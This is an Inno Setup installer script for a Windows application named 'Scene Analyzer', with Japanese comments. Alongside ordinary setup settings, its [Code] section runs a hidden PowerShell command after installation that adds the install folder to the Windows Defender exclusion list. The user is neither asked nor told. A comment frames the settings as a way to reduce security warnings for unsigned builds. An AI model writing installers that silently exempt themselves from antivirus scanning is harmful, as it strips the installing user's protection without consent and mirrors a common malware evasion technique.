#define MyAppName "Scene Analyzer"
#define MyAppVersion "1.0.0"
#define MyAppPublisher "Scene Analyzer Team"
#define MyAppURL "https://example.com/scene-analyzer"
#define MyAppExeName "SceneAnalyzer.exe"

[Setup]
; アプリケーション名とバージョン
AppId={{F8A2A4B7-3C1D-4E8F-9B5A-8D7E6F4C9E3D}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher={#MyAppPublisher}
AppPublisherURL={#MyAppURL}
AppSupportURL={#MyAppURL}
AppUpdatesURL={#MyAppURL}

; インストール先ディレクトリ
DefaultDirName={autopf}\{#MyAppName}
DefaultGroupName={#MyAppName}
DisableProgramGroupPage=yes
OutputDir=installer
OutputBaseFilename=SceneAnalyzer_Setup_{#MyAppVersion}

; 圧縮設定
Compression=lzma
SolidCompression=yes

; UI設定
WizardStyle=modern

; 管理者権限が必要かどうか
PrivilegesRequired=lowest
PrivilegesRequiredOverridesAllowed=dialog

; セキュリティ関連の設定
; 署名されていない場合でもセキュリティ警告を減らすための設定
SetupLogging=yes
SignTool=signtool sign /f "$f" /t http://timestamp.digicert.com /d "{#MyAppName}" $f

[Languages]
Name: "japanese"; MessagesFile: "compiler:Languages\Japanese.isl"
Name: "english"; MessagesFile: "compiler:Default.isl"

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked

[Files]
; アプリケーションファイル
Source: "dist\SceneAnalyzer\SceneAnalyzer.exe"; DestDir: "{app}"; Flags: ignoreversion signonce
Source: "dist\SceneAnalyzer\_internal\*"; DestDir: "{app}\_internal"; Flags: ignoreversion recursesubdirs createallsubdirs

[Icons]
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
Name: "{group}\{cm:UninstallProgram,{#MyAppName}}"; Filename: "{uninstallexe}"
Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon

[Run]
Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent

[UninstallDelete]
Type: filesandordirs; Name: "{app}\_internal"

[Code]
// インストール前にウイルス対策ソフトの除外設定を追加
procedure InitializeWizard;
begin
  // ここに初期化コードを追加
end;

// インストール完了時にWindows Defenderの除外設定を追加
procedure CurStepChanged(CurStep: TSetupStep);
var
  ResultCode: Integer;
begin
  if CurStep = ssPostInstall then
  begin
    // Windows Defenderの除外設定を追加
    Exec('powershell.exe', '-Command "Add-MpPreference -ExclusionPath ' + ExpandConstant('{app}') + '"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  end;
end; 